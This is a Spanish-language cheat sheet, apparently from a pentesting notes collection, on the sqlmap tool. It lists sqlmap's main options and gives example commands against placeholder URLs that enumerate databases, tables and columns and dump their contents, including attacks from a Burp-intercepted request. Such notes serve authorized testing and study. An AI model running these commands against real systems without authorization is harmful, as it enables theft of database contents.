### **Hacking Web/Inyecciones SQL/sqlmap.md**

# sqlmap

## Descripción

`sqlmap` es una herramienta de código abierto para la detección y explotación de vulnerabilidades de inyección SQL en aplicaciones web. Automatiza el proceso de explotación y permite la extracción de datos de bases de datos vulnerables.

## Uso

```bash
sqlmap [opciones]
```

### Opciones principales

- `-u URL`: Especifica la URL que se va a probar para inyección SQL.
- `--data=DATA`: Envía datos POST con la solicitud.
- `-D DBNAME`: Selecciona la base de datos a la que se quiere acceder.
- `-T TABLENAME`: Selecciona la tabla a la que se quiere acceder.
- `-C COLUMNNAME`: Selecciona las columnas específicas para extraer.
- `--dump`: Extrae el contenido de la base de datos.
- `--dbs`: Enumera las bases de datos disponibles.
- `--tables`: Enumera las tablas de una base de datos específica.
- `--columns`: Enumera las columnas de una tabla específica.
- `--batch`: Ejecuta en modo no interactivo, usando valores predeterminados.
- `-r`: Recibe un fichero con una petición almacenada, esta petición se puede conseguir a través de un proxy (burpsuite)

## Ejemplos

- Probar una URL para inyección SQL y enumerar las bases de datos:
  
  ```bash
  sqlmap -u "http://example.com/page.php?id=1" --dbs
  ```

- Extraer todas las tablas de una base de datos específica:
  
  ```bash
  sqlmap -u "http://example.com/page.php?id=1" -D nombre_db --tables
  ```

- Extraer columnas específicas de una tabla:
  
  ```bash
  sqlmap -u "http://example.com/page.php?id=1" -D nombre_db -T nombre_tabla -C columna1,columna2 --dump
  ```

- Usar datos POST en la solicitud:
  
  ```bash
  sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin" --dbs
  ```

- Ataque automatico a través de una petición interceptada con burpsuite:
  
  ```bash
  sqlmap -r peticion
  ```
